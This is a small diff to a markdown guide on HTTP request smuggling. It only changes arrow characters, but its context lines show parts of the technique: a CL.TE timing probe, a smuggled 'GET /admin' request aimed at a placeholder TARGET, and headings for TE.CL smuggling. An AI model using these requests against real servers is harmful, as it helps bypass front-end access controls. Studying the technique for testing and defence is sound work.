@@ -18,7 +18,7 @@ Content-Length: 6
 
 G
 ```
-→ If response is delayed (~5 seconds), front-end used CL, back-end used TE → CL.TE smuggling.
+-> If response is delayed (~5 seconds), front-end used CL, back-end used TE -> CL.TE smuggling.
 
 #### STEP 2: CL.TE SMUGGLING
 ```http
@@ -32,7 +32,7 @@ Transfer-Encoding: chunked
 GET /admin HTTP/1.1
 Host: TARGET
 ```
-→ Front-end uses Content-Length (35 bytes), back-end uses Transfer-Encoding (0 terminates).
+-> Front-end uses Content-Length (35 bytes), back-end uses Transfer-Encoding (0 terminates).
 
 #### STEP 3: TE.CL SMUGGLING
 ```http
